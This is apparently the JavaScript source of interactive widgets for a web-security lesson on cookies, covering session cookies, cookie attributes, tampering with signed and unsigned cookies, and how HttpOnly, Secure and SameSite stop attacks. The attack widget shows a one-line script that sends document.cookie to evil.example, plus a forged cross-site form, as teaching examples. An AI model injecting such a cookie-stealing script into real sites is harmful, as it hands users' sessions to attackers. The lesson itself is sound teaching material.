/* Web part, "Cookies, Tracking and Privacy" chapter, first group: how cookies work and how they are attacked.
   ckdance    step through one visit: first visit, logging in, a third-party image
   ckbuilder  build a Set-Cookie header, see if the browser keeps it and which requests carry it back
   ckshop     delete, edit and steal a cookie: server-side session, plain cookie, signed cookie
   ckattack   HttpOnly, Secure and SameSite against script theft, forged requests and Wi-Fi snooping
   The rules come from window.__ck (src/ws-9-cookies-engine.js), which test/cookie_rules.py checks against a real Chromium.
   Colours come from CSS classes in src/cookies.add.css so every picture follows the light and dark themes. */
(function () {
  'use strict';
  if (!window.__core) return;
  var K = window.__core, esc = K.esc, h = K.h, W = window.__widgets = window.__widgets || {};
  var U = function () { return window.__ckui; }, CK = function () { return window.__ck; };
  function wrap(t, s, c) { return U().wrap(t, s, c); }
  function chips(a, b, c) { return U().chips(a, b, c); }
  function pill(k, t) { return U().pill(k, t); }

  /* ================= ckdance ================= */
  var DANCE = {
    first: {
      label: 'A first visit and a return visit to shop.example',
      actors: [{ label: 'Your browser', sub: 'cookie jar: empty' }, { label: 'shop.example', sub: 'the server' }],
      steps: [
        { f: 0, t: 1, kind: 'req', label: 'GET /', note: 'You type the address. Your browser has never been here, so its **cookie jar** holds nothing for `shop.example` and the request carries no `Cookie` header. To the server you are a stranger.' },
        { f: 1, t: 0, kind: 'ok', label: '200 OK · Set-Cookie: visitor=8F31A92B', note: 'The server makes up a random number and asks the browser to keep it: `Set-Cookie: visitor=8F31A92B; Max-Age=31536000; Secure; HttpOnly; SameSite=Lax`. It also writes a row in its own database: *visitor 8F31A92B, first seen just now*.' },
        { f: 0, t: 1, kind: 'req', label: 'GET /products · Cookie: visitor=8F31A92B', note: 'You click a link. The browser looks in the jar, finds a cookie whose domain, path and attributes match this request, and attaches it **without asking you**. This happens on every request to this site until the cookie expires.' },
        { f: 1, t: 0, kind: 'ok', label: '200 OK · "welcome back"', note: 'The server looks `8F31A92B` up in its database and finds the earlier visit. It can now add this page view to the same record. HTTP has no memory of its own; the cookie lends it one.' }
      ],
      verdict: { cls: 'ok', head: 'Recognised', text: 'The server did not learn who you are. It learned that **this browser** came back. A cookie is a name tag the server hands out and reads back.' }
    },
    login: {
      label: 'Logging in with a session cookie',
      actors: [{ label: 'Your browser', sub: 'cookie jar' }, { label: 'bank.example', sub: 'the server' }],
      steps: [
        { f: 0, t: 1, kind: 'req', label: 'POST /login · email + password', note: 'You type your password into a form. This is the **only** time the password travels. The request is over HTTPS, so it is encrypted on the way.' },
        { f: 1, t: 0, kind: 'ok', label: '200 · Set-Cookie: session=k3J9xQ…', note: 'The server checks the password, creates a session record (*k3J9xQ… belongs to Sam, expires in 30 minutes*), and sends the key: `Set-Cookie: session=k3J9xQ…; Secure; HttpOnly; SameSite=Lax`. Safe settings matter more here than anywhere.' },
        { f: 0, t: 1, kind: 'req', label: 'GET /account · Cookie: session=k3J9xQ…', note: 'From now on the browser proves it is you by sending the cookie, not the password. The cookie is a **temporary password**.' },
        { f: 1, t: 0, kind: 'ok', label: '200 · "Hi Sam, balance 1,204"', note: 'The server finds the session record and returns Sam’s page. The page content is on the server; the cookie only points at it.' }
      ],
      verdict: { cls: 'warn', head: 'Whoever holds it is you', text: 'The server cannot tell a browser that was given the cookie from one that stole it. That is why **HttpOnly** (scripts cannot read it), **Secure** (never sent in clear) and short lifetimes exist. The next labs try each of them.' }
    },
    third: {
      label: 'A third-party tracking image seen on two sites',
      actors: [{ label: 'Your browser', sub: 'cookie jar' }, { label: 'news.example', sub: 'site 1' }, { label: 'shop.example', sub: 'site 2' }, { label: 'ads.example', sub: 'the tracker' }],
      steps: [
        { f: 0, t: 1, kind: 'req', label: 'GET /article', note: 'You open an article on **news.example**. This is the site you chose to visit: the *first party*.' },
        { f: 1, t: 0, kind: 'ok', label: '200 · page with <img ads.example>', note: 'The page contains a tiny image served by **ads.example**: a *third party* you never visited. The page also tells the browser which page it is on.' },
        { f: 0, t: 3, kind: 'req', label: 'GET /p.gif · Referer: news.example', note: 'Your browser fetches the image. This request goes to ads.example, so the browser looks in the jar for **ads.example** cookies. There are none yet. The tracker does learn the page address, your IP address and your browser details.' },
        { f: 3, t: 0, kind: 'warn', label: '200 · Set-Cookie: uid=77c1; SameSite=None', note: 'The tracker hands out an ID: `Set-Cookie: uid=77c1; Max-Age=63072000; Secure; SameSite=None`. `SameSite=None` is what lets a cookie travel in a request that started on a different site.' },
        { f: 0, t: 2, kind: 'req', label: 'GET /cart', note: 'Days later you open **shop.example**, a completely different company.' },
        { f: 2, t: 0, kind: 'ok', label: '200 · page with the same <img>', note: 'Many sites embed the same ad network, analytics tag or social button. Each one is a doorway to the same tracker.' },
        { f: 0, t: 3, kind: 'req', label: 'GET /p.gif · Cookie: uid=77c1', note: 'The browser fetches the image again. The jar has an `ads.example` cookie, so it is attached, together with `Referer: shop.example/cart`.' }
      ],
      verdict: { cls: 'bad', head: 'Linked', text: 'ads.example has now seen **uid=77c1 on news.example and on shop.example**. Neither site had to tell it anything. Safari and Firefox stop this (next labs), Chrome still allows it unless you change a setting.' }
    }
  };
  function dance() {
    var r = wrap('The cookie dance', 'Step through three real exchanges. Click a message in the picture, or use the buttons.');
    var ctl = h('div', { class: 'ck-row' }), holder = h('div', { class: 'ck-fig' }), st = { sc: 'first' };
    r.appendChild(ctl); r.appendChild(holder);
    function draw() {
      ctl.innerHTML = '<span class="ck-lab">Story</span>' + chips([['first', '1. First visit'], ['login', '2. Logging in'], ['third', '3. A third party']], st.sc, 'data-s');
      if (holder.firstChild && holder.firstChild.__stop) holder.firstChild.__stop();
      holder.innerHTML = '';
      var c = DANCE[st.sc];
      holder.appendChild(window.__netviz.seq(c));
    }
    ctl.addEventListener('click', function (e) { var b = e.target.closest('[data-s]'); if (!b) return; st.sc = b.getAttribute('data-s'); draw(); });
    draw();
    return r;
  }

  /* ================= ckbuilder ================= */
  var SET_URL = 'https://www.shop.example/account/orders';
  var B_TESTS = [
    { t: 'Reload this page', req: { url: 'https://www.shop.example/account/orders', context: 'https://www.shop.example/account/orders', nav: true, method: 'GET' } },
    { t: 'Another page on the site (/)', req: { url: 'https://www.shop.example/', context: 'https://www.shop.example/account/orders', nav: true, method: 'GET' } },
    { t: 'A sibling subdomain (pay.shop.example)', req: { url: 'https://pay.shop.example/', context: 'https://www.shop.example/account/orders', nav: true, method: 'GET' } },
    { t: 'The same page over plain http', req: { url: 'http://www.shop.example/account/orders', context: 'http://www.shop.example/account/orders', nav: true, method: 'GET' } },
    { t: 'A shop image embedded in a page on news.example', req: { url: 'https://www.shop.example/account/logo.png', context: 'https://news.example/story', nav: false, method: 'GET' } },
    { t: 'You click a link on news.example to this page', req: { url: 'https://www.shop.example/account/orders', context: 'https://news.example/story', nav: true, method: 'GET' } },
    { t: 'A form on news.example posts to this page', req: { url: 'https://www.shop.example/account/orders', context: 'https://news.example/story', nav: true, method: 'POST' } }
  ];
  var B_PRESETS = {
    login: { name: 'session', value: 'k3J9xQ', domain: '', path: '/', age: '', secure: true, httponly: true, ss: 'Lax' },
    pref: { name: 'theme', value: 'dark', domain: '', path: '/', age: '31536000', secure: false, httponly: false, ss: 'Lax' },
    track: { name: 'uid', value: '77c1e0', domain: 'shop.example', path: '/', age: '63072000', secure: true, httponly: false, ss: 'None' },
    widget: { name: 'chat', value: 'a81f', domain: '', path: '/', age: '', secure: true, httponly: true, ss: 'None' },
    bare: { name: 'visitor', value: '8F31A92B', domain: '', path: '', age: '', secure: false, httponly: false, ss: '' },
    bad1: { name: 'token', value: 'x', domain: '', path: '/', age: '', secure: false, httponly: false, ss: 'None' },
    bad2: { name: 'uid', value: 'x', domain: 'other.example', path: '/', age: '', secure: false, httponly: false, ss: '' },
    bad3: { name: '__Host-id', value: 'x', domain: 'shop.example', path: '/', age: '', secure: true, httponly: true, ss: 'Lax' }
  };
  function buildHeader(s) {
    var o = s.name + '=' + s.value;
    if (s.domain) o += '; Domain=' + s.domain;
    if (s.path) o += '; Path=' + s.path;
    if (s.age !== '') o += '; Max-Age=' + s.age;
    if (s.secure) o += '; Secure';
    if (s.httponly) o += '; HttpOnly';
    if (s.ss) o += '; SameSite=' + s.ss;
    return o;
  }
  function builder() {
    var r = wrap('Set-Cookie workbench', 'Build the header a server sends. The browser decides whether to keep it, and which later requests carry it back. These are the real rules, checked against Chrome.');
    var st = JSON.parse(JSON.stringify(B_PRESETS.login));
    var pre = h('div', { class: 'ck-row' }), form = h('div', { class: 'ck-form' }), out = h('div', { class: 'ck-out', 'aria-live': 'polite' });
    r.appendChild(pre); r.appendChild(form); r.appendChild(out);
    function opt(list, cur) { return list.map(function (o) { return '<option value="' + esc(o[0]) + '"' + (o[0] === cur ? ' selected' : '') + '>' + esc(o[1]) + '</option>'; }).join(''); }
    function drawForm() {
      pre.innerHTML = '<span class="ck-lab">Start from</span>' + [['login', 'Login session'], ['pref', 'Preference'], ['track', 'Tracking ID'], ['widget', 'Cross-site widget'], ['bare', 'No attributes'], ['bad1', 'Mistake: None without Secure'], ['bad2', 'Mistake: someone else’s domain'], ['bad3', 'Mistake: __Host- with Domain']].map(function (p) {
        return '<button type="button" class="chip" data-p="' + p[0] + '">' + esc(p[1]) + '</button>';
      }).join('');
      form.innerHTML = '<label>Name<input type="text" data-k="name" value="' + esc(st.name) + '" spellcheck="false" autocomplete="off"></label>' +
        '<label>Value<input type="text" data-k="value" value="' + esc(st.value) + '" spellcheck="false" autocomplete="off"></label>' +
        '<label>Domain<select data-k="domain">' + opt([['', '(not set: this host only)'], ['shop.example', 'shop.example'], ['www.shop.example', 'www.shop.example'], ['other.example', 'other.example'], ['example', 'example (a public suffix)']], st.domain) + '</select></label>' +
        '<label>Path<select data-k="path">' + opt([['', '(not set)'], ['/', '/'], ['/account', '/account'], ['/shop', '/shop']], st.path) + '</select></label>' +
        '<label>Lifetime<select data-k="age">' + opt([['', 'session (Max-Age not set)'], ['3600', 'Max-Age=3600 (1 hour)'], ['2592000', 'Max-Age=2592000 (30 days)'], ['31536000', 'Max-Age=31536000 (1 year)'], ['63072000', 'Max-Age=63072000 (2 years)'], ['0', 'Max-Age=0 (delete it)']], st.age) + '</select></label>' +
        '<label>SameSite<select data-k="ss">' + opt([['', '(not set)'], ['Strict', 'Strict'], ['Lax', 'Lax'], ['None', 'None']], st.ss) + '</select></label>' +
        '<label class="ck-chk"><input type="checkbox" data-k="secure"' + (st.secure ? ' checked' : '') + '> Secure</label>' +
        '<label class="ck-chk"><input type="checkbox" data-k="httponly"' + (st.httponly ? ' checked' : '') + '> HttpOnly</label>';
    }
    function drawOut() {
      var C = CK(), hdr = buildHeader(st), res = C.setCookie(hdr, SET_URL);
      var o = '<div class="ck-hdr"><span class="ck-dim">Set-Cookie: </span>' + esc(hdr) + '</div><p class="ck-dim ck-fine">sent in the response to <code>' + esc(SET_URL) + '</code></p>';
      if (!res.ok) {
        o += '<div class="ck-verdict ck-bad"><b>Refused</b><span>' + esc(res.reason) + '</span></div>';
        out.innerHTML = o; return;
      }
      var c = res.cookie;
      if (res.deletes) {
        o += '<div class="ck-verdict ck-warn"><b>Deleted</b><span>A lifetime of zero or less is how a server tells the browser to throw a cookie away. Servers use it to log you out.</span></div>';
        out.innerHTML = o; return;
      }
      o += '<div class="ck-verdict ck-ok"><b>Stored</b><span>' + esc(c.name) + ' for ' + (c.hostOnly ? '<b>' + esc(c.domain) + '</b> only' : '<b>' + esc(c.domain) + '</b> and every subdomain') + ', paths under <code>' + esc(c.path) + '</code>. ' + (c.life === null ? 'A session cookie: kept until the browser session ends.' : 'It lives ' + esc(C.lifeText(c.life)) + '.') + '</span></div>';
      if (res.notes.length) o += '<ul class="ck-notes">' + res.notes.map(function (n) { return '<li>' + esc(n) + '</li>'; }).join('') + '</ul>';
      var rows = B_TESTS.map(function (t) {
        var d = C.decide(c, t.req);
        return '<tr><th scope="row">' + esc(t.t) + '<small>' + esc((t.req.method === 'POST' ? 'POST ' : '') + t.req.url.replace('https://', '')) + (t.req.context !== t.req.url ? ' from ' + esc(t.req.context.replace('https://', '')) : '') + '</small></th><td>' + pill(d.sent ? 'ok' : 'mute', d.sent ? 'sent' : 'not sent') + '</td><td>' + esc(d.text) + '</td></tr>';
      });
      var js = C.jsVisible(c, SET_URL);
      rows.push('<tr><th scope="row">A script on this page reads <code>document.cookie</code></th><td>' + pill(js.yes ? 'bad' : 'ok', js.yes ? 'readable' : 'hidden') + '</td><td>' + esc(js.text) + (js.yes ? ' Any script on the page, including a third-party one or an injected one, can read and send it.' : '') + '</td></tr>');
      o += '<div class="ck-scroll"><table class="ck-t"><thead><tr><th>A request to…</th><th>Cookie</th><th>Why</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
      out.innerHTML = o;
    }
    function draw() { drawForm(); drawOut(); }
    pre.addEventListener('click', function (e) { var b = e.target.closest('[data-p]'); if (!b) return; st = JSON.parse(JSON.stringify(B_PRESETS[b.getAttribute('data-p')])); draw(); });
    form.addEventListener('input', function (e) { var k = e.target.getAttribute('data-k'); if (!k || e.target.tagName !== 'INPUT' || e.target.type === 'checkbox') return; st[k] = e.target.value; drawOut(); });
    form.addEventListener('change', function (e) {
      var k = e.target.getAttribute('data-k'); if (!k) return;
      st[k] = e.target.type === 'checkbox' ? e.target.checked : e.target.value; drawOut();
    });
    draw();
    return r;
  }

  /* ================= ckshop ================= */
  // A toy signature so the lab runs offline; real sites use HMAC-SHA256 with a secret the browser never sees.
  function toySig(s) {
    var h1 = 0xdeadbeef, h2 = 0x41c6ce57;
    for (var i = 0, ch; i < s.length; i++) { ch = s.charCodeAt(i); h1 = Math.imul(h1 ^ ch, 2654435761); h2 = Math.imul(h2 ^ ch, 1597334677); }
    h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
    h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
    return (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16);
  }
  var SECRET = 'server-only-secret';
  function signed(obj) { var p = btoa(JSON.stringify(obj)); return p + '.' + toySig(SECRET + p); }
  function rnd(n) { var a = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789', s = ''; while (n--) s += a.charAt(Math.floor(Math.random() * a.length)); return s; }

  var SHOP_MODES = [['server', 'Session ID, data on the server'], ['plain', 'Data in the cookie, plain'], ['signed', 'Data in the cookie, signed']];
  var SHOP_INTRO = {
    server: 'The cookie is only a random key. Sam’s name, cart and role are in a table on the server. This is the usual design for logins.',
    plain: 'The server put the data itself in the cookie, trusting the browser to hand it back unchanged. Convenient, and a classic mistake.',
    signed: 'The data is in the cookie, but with a signature only the server can make. You can read it, you cannot change it without the server noticing. (Signed is not secret.)'
  };
  function shop() {
    var r = wrap('Delete it, edit it, steal it', 'A tiny shop in three designs. Log in, add to the cart, then do to the cookie what a curious user or an attacker would.');
    var st = { mode: 'server', val: null, db: {}, log: [] };
    var ctl = h('div', { class: 'ck-row' }), grid = h('div', { class: 'ck-shop' });
    r.appendChild(ctl); r.appendChild(grid);

    function view(val) {      // what the server makes of a cookie value
      var m = st.mode;
      if (val === null || val === '') return { who: null, why: 'No cookie arrived, so the server treats this as a new visitor.' };
      if (m === 'server') {
        var s = st.db[val];
        return s ? { who: s.user, role: s.role, cart: s.cart, why: 'The server found session ' + val + ' in its table.' } : { who: null, why: 'The server has no session called "' + val + '". Real IDs are 128 random bits, so guessing one is hopeless.' };
      }
      if (m === 'plain') {
        var q = new URLSearchParams(val);
        return q.get('user') ? { who: q.get('user'), role: q.get('role') || 'user', cart: +q.get('cart') || 0, why: 'The server believed whatever the cookie said. Nothing proves the browser did not edit it.' } : { who: null, why: 'The cookie has no user=, so this is a visitor.' };
      }
      var i = val.lastIndexOf('.'), p = val.slice(0, i), sg = val.slice(i + 1);
      if (i < 0 || toySig(SECRET + p) !== sg) return { who: null, bad: true, why: 'The signature does not match the data. The server threw the cookie away.' };
      try { var o = JSON.parse(atob(p)); return { who: o.u, role: o.r, cart: o.c, why: 'The signature matches, so the server trusts the data.' }; } catch (e) { return { who: null, bad: true, why: 'The data could not be read.' }; }
    }
    function page(v, label) {
      if (!v.who) return '<div class="ck-page ck-anon"><b>' + esc(label) + '</b><p>Signed out. Cart: empty.</p>' + (v.bad ? '<p class="ck-badline">Tampering detected</p>' : '') + '<small>' + esc(v.why) + '</small></div>';
      var adm = v.role === 'admin';
      return '<div class="ck-page ' + (adm ? 'ck-admin' : 'ck-user') + '"><b>' + esc(label) + '</b><p>Hi ' + esc(v.who) + '. Cart: ' + v.cart + ' item' + (v.cart === 1 ? '' : 's') + '. Role: ' + esc(v.role) + '</p>' + (adm ? '<p class="ck-badline">Admin panel: delete all orders</p>' : '') + '<small>' + esc(v.why) + '</small></div>';
    }
    function cookieText() {
      if (st.val === null) return '(no cookie)';
      return (st.mode === 'server' ? 'sid' : 'acct') + '=' + st.val;
    }
    function draw() {
      ctl.innerHTML = '<span class="ck-lab">Design</span>' + chips(SHOP_MODES, st.mode, 'data-m');
      var v = view(st.val), vb = view(st.stolen ? st.val : null);
      var dec = '';
      if (st.val !== null && st.mode === 'signed') { var i = st.val.lastIndexOf('.'); try { dec = '<small class="ck-dim">readable payload: ' + esc(atob(st.val.slice(0, i))) + '</small>'; } catch (e) { } }
      grid.innerHTML = '<p class="ck-say">' + esc(SHOP_INTRO[st.mode]) + '</p>' +
        '<div class="ck-cols"><section aria-label="Your browser"><h5>Your browser</h5><div class="ck-cookie"><span class="ck-dim">cookie jar</span><code>' + esc(cookieText()) + '</code>' + dec + '</div>' +
        '<div class="ck-btns"><button type="button" class="chip" data-a="login">Log in as Sam</button><button type="button" class="chip" data-a="add"' + (!v.who ? ' disabled' : '') + '>Add to cart</button><button type="button" class="chip" data-a="del"' + (st.val === null ? ' disabled' : '') + '>Delete the cookie</button></div>' +
        '<label class="ck-edit">Edit the cookie value<span><input type="text" data-edit value="' + esc(st.val === null ? '' : st.val) + '" spellcheck="false" autocomplete="off" aria-label="Cookie value"><button type="button" class="chip" data-a="apply">Apply</button></span></label>' +
        '<div class="ck-btns"><button type="button" class="chip" data-a="admin"' + (st.val === null ? ' disabled' : '') + '>Make it role=admin</button><button type="button" class="chip" data-a="steal"' + (st.val === null ? ' disabled' : '') + '>Copy it to a stranger’s browser</button></div>' +
        page(v, 'What your browser shows') + '</section>' +
        '<section aria-label="The server"><h5>The server' + (st.mode === 'server' ? '’s session table' : '') + '</h5>' +
        (st.mode === 'server' ? '<table class="ck-t ck-mini"><thead><tr><th>session id</th><th>user</th><th>cart</th><th>role</th></tr></thead><tbody>' + (Object.keys(st.db).map(function (k) { var s = st.db[k]; return '<tr><td><code>' + esc(k) + '</code></td><td>' + esc(s.user) + '</td><td>' + s.cart + '</td><td>' + esc(s.role) + '</td></tr>'; }).join('') || '<tr><td colspan="4" class="ck-dim">empty</td></tr>') + '</tbody></table>' : '<p class="ck-dim ck-fine">Nothing stored about Sam. Everything the server knows arrives inside the cookie, on every request.</p>') +
        (st.stolen ? page(vb, 'A stranger with a copy of your cookie') : '<p class="ck-dim ck-fine">Press <b>Copy it to a stranger’s browser</b> to see what a stolen cookie is worth.</p>') +
        '</section></div><div class="ck-lg" aria-live="polite">' + (st.msg ? esc(st.msg) : '') + '</div>';
    }
    function setMsg(m) { st.msg = m; }
    grid.addEventListener('click', function (e) {
      var b = e.target.closest('[data-a]'); if (!b) return;
      var a = b.getAttribute('data-a'), m = st.mode, v = view(st.val);
      if (a === 'login') {
        if (m === 'server') { var id = rnd(10); st.db[id] = { user: 'Sam', cart: 0, role: 'user' }; st.val = id; }
        else if (m === 'plain') st.val = 'user=Sam&role=user&cart=0';
        else st.val = signed({ u: 'Sam', r: 'user', c: 0 });
        setMsg('The server accepted the password and sent a cookie.');
      } else if (a === 'add') {
        if (m === 'server') { st.db[st.val].cart++; setMsg('The server changed its own table. The cookie did not change at all.'); }
        else if (m === 'plain') { var q = new URLSearchParams(st.val); q.set('cart', (+q.get('cart') || 0) + 1); st.val = q.toString(); setMsg('The server sent back a new cookie with cart+1.'); }
        else { st.val = signed({ u: v.who, r: v.role, c: v.cart + 1 }); setMsg('The server re-signed the data and sent a new cookie.'); }
      } else if (a === 'del') {
        st.val = null; st.stolen = false;
        setMsg(m === 'server' ? 'You threw away the key. Sam’s record is still in the server’s table until it expires, but nobody holds the key.' : 'You threw away the cookie, and with it the cart: it lived in the cookie.');
      } else if (a === 'apply') {
        var t = grid.querySelector('[data-edit]').value; st.val = t === '' ? null : t; st.stolen = false;
        setMsg('You replaced the cookie with your own text.');
      } else if (a === 'admin') {
        if (m === 'server') { st.val = 'admin'; setMsg('There is no session called "admin", so there is nothing to promote.'); }
        else if (m === 'plain') { var q2 = new URLSearchParams(st.val); q2.set('role', 'admin'); st.val = q2.toString(); setMsg('You changed role=user to role=admin in your own cookie jar.'); }
        else { var i = st.val.lastIndexOf('.'); var o; try { o = JSON.parse(atob(st.val.slice(0, i))); } catch (e) { o = { u: 'Sam', r: 'user', c: 0 }; } o.r = 'admin'; st.val = btoa(JSON.stringify(o)) + '.' + st.val.slice(i + 1); setMsg('You edited the payload but could not recompute the signature, which needs the server’s secret.'); }
      } else if (a === 'steal') { st.stolen = true; setMsg('The stranger pastes your cookie into their own browser. The server cannot tell the difference.'); }
      draw();
    });
    ctl.addEventListener('click', function (e) { var b = e.target.closest('[data-m]'); if (!b) return; st.mode = b.getAttribute('data-m'); st.val = null; st.stolen = false; st.msg = ''; draw(); });
    draw();
    return r;
  }

  /* ================= ckattack ================= */
  function attack() {
    var r = wrap('Three attacks, three attributes', 'Set the cookie’s attributes and see which attacks still work against bank.example. Each result comes from the same rules as the workbench.');
    var st = { httponly: false, secure: false, ss: '', http: true };
    var ctl = h('div', { class: 'ck-row' }), out = h('div', { class: 'ck-cards', 'aria-live': 'polite' });
    r.appendChild(ctl); r.appendChild(out);
    var BANK = 'https://bank.example/account';
    function draw() {
      ctl.innerHTML = '<span class="ck-lab">Cookie</span><label class="ck-chk"><input type="checkbox" data-k="httponly"' + (st.httponly ? ' checked' : '') + '> HttpOnly</label>' +
        '<label class="ck-chk"><input type="checkbox" data-k="secure"' + (st.secure ? ' checked' : '') + '> Secure</label>' +
        '<label>SameSite<select data-k="ss"><option value=""' + (st.ss === '' ? ' selected' : '') + '>(not set)</option><option value="Strict"' + (st.ss === 'Strict' ? ' selected' : '') + '>Strict</option><option value="Lax"' + (st.ss === 'Lax' ? ' selected' : '') + '>Lax</option><option value="None"' + (st.ss === 'None' ? ' selected' : '') + '>None</option></select></label>' +
        '<span class="ck-lab">The user</span><label class="ck-chk"><input type="checkbox" data-k="http"' + (st.http ? ' checked' : '') + '><span>sometimes types <code>http://</code> or follows an old http link</span></label>';
      var hdr = 'session=k3J9xQ' + (st.secure ? '; Secure' : '') + (st.httponly ? '; HttpOnly' : '') + (st.ss ? '; SameSite=' + st.ss : '');
      var C = CK(), res = C.setCookie(hdr, BANK);
      if (!res.ok) { out.innerHTML = '<div class="ck-verdict ck-bad"><b>Refused</b><span>' + esc(res.reason) + ' Turn on Secure or change SameSite.</span></div>'; return; }
      var c = res.cookie;
      var xss = C.jsVisible(c, BANK);
      var csrf = C.decide(c, { url: BANK + '/transfer', context: 'https://evil.example/', nav: true, method: 'POST' });
      var snoop = C.decide(c, { url: 'http://bank.example/account', context: 'http://bank.example/account', nav: true, method: 'GET' });
      var cards = [
        { t: '1. A script steals the cookie', sub: 'A comment field is not escaped (cross-site scripting). The attacker’s script runs on bank.example and tries document.cookie.', bad: xss.yes,
          code: 'fetch("https://evil.example/?c=" + document.cookie)',
          res: xss.yes ? 'Works. The script reads the session cookie and posts it to the attacker, who pastes it into their own browser.' : 'The cookie is not in document.cookie, so this script cannot copy it. Note the limit: the script can still send requests that carry the cookie from inside your browser, for as long as the page stays open.' },
        { t: '2. A page on another site forges a request', sub: 'You visit evil.example while signed in to bank.example. Its page submits a hidden form to bank.example/transfer (cross-site forgery, CSRF).', bad: csrf.sent,
          code: '<form method=post action="https://bank.example/account/transfer">',
          res: csrf.sent ? 'Works. The browser attaches the cookie to the cross-site POST, so the bank sees a request from a signed-in Sam. (' + csrf.text + ')' : 'The browser leaves the cookie at home, so the bank sees a request from nobody and refuses it. ' + csrf.text + (st.ss === '' ? ' (Chrome makes a two-minute exception for cookies with no SameSite, so say it explicitly.)' : '') + ' A CSRF token is still good practice.' },
        { t: '3. Someone on the café Wi-Fi listens', sub: st.http ? 'The user’s browser makes one plain-http request to bank.example before the redirect to https. Anyone on the same Wi-Fi can read it.' : 'The site is only ever reached over https, so there is no clear-text request to read.', bad: st.http && snoop.sent,
          code: 'GET http://bank.example/account  Cookie: session=k3J9xQ',
          res: !st.http ? 'No clear-text request exists, so there is nothing to see. (Add HSTS so browsers never try http at all.)' : snoop.sent ? 'Works. The cookie went out unencrypted in the first request and the listener has a working session.' : 'The browser does not attach a Secure cookie to an http request, so the clear-text request carries nothing worth stealing.' }
      ];
      out.innerHTML = '<div class="ck-hdr"><span class="ck-dim">Set-Cookie: </span>' + esc(hdr) + '</div>' + cards.map(function (x) {
        return '<article class="ck-card ' + (x.bad ? 'ck-cbad' : 'ck-cok') + '"><h5>' + esc(x.t) + ' ' + pill(x.bad ? 'bad' : 'ok', x.bad ? 'attack works' : 'blocked') + '</h5><p class="ck-fine">' + esc(x.sub) + '</p><pre class="ck-code">' + esc(x.code) + '</pre><p>' + esc(x.res) + '</p></article>';
      }).join('');
    }
    ctl.addEventListener('change', function (e) { var k = e.target.getAttribute('data-k'); if (!k) return; st[k] = e.target.type === 'checkbox' ? e.target.checked : e.target.value; draw(); });
    draw();
    return r;
  }

  W.ckdance = dance; W.ckbuilder = builder; W.ckshop = shop; W.ckattack = attack;
})();
